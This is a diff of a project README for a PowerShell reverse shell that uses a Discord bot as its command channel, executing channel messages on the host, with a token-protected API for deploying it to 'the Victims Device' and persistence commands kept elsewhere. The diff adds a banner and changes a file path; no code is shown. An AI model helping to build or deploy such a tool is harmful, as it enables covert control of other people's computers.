@@ -1,3 +1,4 @@
+![](.src/banner.png)
 # X-Shell
 
 ### This is a simple powershell script that establishes a connection to a Discord server using a Bot to listen on a specified channel. All messages from that channel will be executed on the machine (reverse Shell). I also added an API, which returns the script when provided with the correct Bearer Token, making it easy to deploy the Reverse Shell on the Victims Device.
@@ -19,7 +20,7 @@
 #### If you encounter any issues feel free to open an Issue
 
 <hr>
-If you wan the Remote connection to be persistent, you could run different commands, found in `commands.txt`
+If you wan the Remote connection to be persistent, you could run different commands, found in .src/commands.txt
 <hr>
 Even tho the API needs an authoriation Token, its still quite simple to fetch the powershell script and abuse the Discord Bot using the token. Ensure the api authorization token doesn't get wrong hands.
 <hr>
